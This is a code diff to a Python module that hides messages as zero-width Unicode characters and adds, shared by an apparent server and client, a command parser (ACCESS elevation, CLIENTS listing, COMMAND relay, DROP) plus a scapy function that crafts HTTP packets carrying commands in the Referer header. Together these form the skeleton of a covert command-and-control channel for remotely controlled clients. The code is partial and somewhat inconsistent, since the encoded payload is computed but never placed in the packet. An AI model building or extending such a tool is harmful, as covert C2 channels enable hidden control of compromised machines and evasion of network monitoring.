@@ -1,3 +1,9 @@
+from scapy.layers.http import HTTP, HTTPRequest
+from scapy.layers.inet import IP
+from scapy.sendrecv import send
+from scapy.all import *
+load_layer('http')
+
 zero = '\u200c'  # 0
 one = '\u200d'  # 1
 
@@ -11,7 +17,7 @@ res = ''
 final_res = ''
 final_final_res = ''
 
-
+''' CONTIANS CODE USED BY BOTH SERVER AND CLIENT'''
 def binary_converter(message):
     global res
 
@@ -66,3 +72,35 @@ def unicode_to_binary(message):
             final_final_res += "1"
         index1 += 3
         index2 += 3
+
+def parser(self,message,client_instance):
+        print(message)
+        message = message[:100].split()
+        print(message)
+        if message != []:
+            command = message[0]
+            if command == "ACCESS" and len(message) == 2:
+                    client_instance.elevatation(message[1])
+            elif client_instance.elevated:
+                print(client_instance.elevated)
+                if command == "CLIENTS" and len(message) == 1:
+                        self.cc.clients(client_instance)
+                elif command == "COMMAND": 
+                    if len(message) == 3:
+                        print("Commad")
+                        self.cc.command(message[1], message[2])
+                    elif len(message) == 4:
+                        self.cc.command(message[1], message[2], message[3])
+                elif command == "DROP" and len(message) == 1:
+                        client_instance.elevatation()
+
+def construct_packet(self, ip, command, message=None):
+        r_input = binary_converter(command + ' ' + message)
+        print(r_input)
+        r_input = binary_to_unicode(r_input)
+        print(r_input)
+
+        packet = IP(dst=ip)/HTTP()/HTTPRequest(
+                    Referer=command
+                )
+        return bytes(packet)
